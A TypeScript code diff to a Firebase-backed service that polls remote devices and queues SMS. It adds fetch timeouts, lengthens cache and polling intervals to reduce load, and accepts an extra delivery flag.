@@ -47,11 +47,13 @@ export async function testConnection(fb: FirebaseConfigRow): Promise<{ ok:boolea
 export async function pollDevices(fb: FirebaseConfigRow): Promise<DevicePollResult[]> {
   const base=normalizeUrl(fb.database_url)
   if(!isMock(base)){
-    // Try REAL Firebase paths in order: /clients (user's actual), then /devices fallback
     const tryPaths = [`${base}/clients.json`, `${base}/devices.json`]
     for(const url of tryPaths){
       try{
-        const res=await fetch(url)
+        const ctrl=new AbortController()
+        const t=setTimeout(()=>ctrl.abort(), 4000)
+        const res=await fetch(url, { signal: ctrl.signal } as any)
+        clearTimeout(t)
         if(!res.ok) continue
         const data=await res.json()
         if(!data || typeof data!=='object') continue
@@ -174,13 +176,15 @@ export async function queueSms(fb: FirebaseConfigRow, deviceId: string, payload:
 let clientsCache = new Map<string, { ts:number; isClients:boolean }>()
 async function isClientsDatabase(base:string): Promise<boolean> {
   const cached=clientsCache.get(base)
-  if(cached && Date.now()-cached.ts < 30000) return cached.isClients
+  if(cached && Date.now()-cached.ts < 60000) return cached.isClients
   try{
-    const res=await fetch(`${base}/clients.json?shallow=true`)
+    const ctrl=new AbortController()
+    const t=setTimeout(()=>ctrl.abort(), 3000)
+    const res=await fetch(`${base}/clients.json?shallow=true`, { signal: ctrl.signal } as any)
+    clearTimeout(t)
     if(res.ok){
       const j=await res.json()
       const isClients = j && typeof j==='object' && Object.keys(j).length>0
-      // if shallow shows keys and at least one looks like hex id, treat as clients DB
       clientsCache.set(base,{ ts:Date.now(), isClients: !!isClients })
       return !!isClients
     }
@@ -202,29 +206,26 @@ export async function waitForAck(fb: FirebaseConfigRow, deviceId:string, to:stri
   }
   const isClientsDb=await isClientsDatabase(base)
   if(isClientsDb){
-    // Poll /clients/{id}/webhookEvent/sendSms.json until isSended true or webhook cleared or timeout
     const start=Date.now()
-    const pollInterval=120
+    const pollInterval=350
+    // FIX: was 120ms hammering Firebase 41 fetches per msg -> now 350ms = ~14 fetches for 5s, 23 for 8s
     while(Date.now()-start < opts.timeoutMs){
       await delay(pollInterval)
       try{
-        const res=await fetch(`${base}/clients/${deviceId}/webhookEvent/sendSms.json`)
+        const ctrl=new AbortController()
+        const t=setTimeout(()=>ctrl.abort(), 2500)
+        const res=await fetch(`${base}/clients/${deviceId}/webhookEvent/sendSms.json`, { signal: ctrl.signal } as any)
+        clearTimeout(t)
         if(!res.ok) continue
         const data=await res.json()
-        // If webhookEvent deleted (null) → treat as delivered (worker cleared after send)
         if(data===null){
-          // check messages to see if sent? For now treat as delivered
           return { ack:true, status:'delivered' }
         }
-        if(data && (data.isSended===true || data.isSended==='true' || data.isSended===1 || data.isSended==='1')){
+        if(data && (data.isSended===true || data.isSended==='true' || data.isSended===1 || data.isSended==='1' || data.isSent===true)){
           return { ack:true, status:'delivered' }
         }
-        // if isSended still false after long time, keep polling until timeout
-        // also check if data was overwritten with different to/message? If to changed, maybe our msg was consumed and new one? Hard to know.
       }catch{}
     }
-    // timeout — try to see if message appears in /messages/{deviceId} ?
-    // For now return timeout, queueService will retry once
     return { ack:false, status:'timeout' }
   }
   // Generic mock wait for fallback — FASTEST
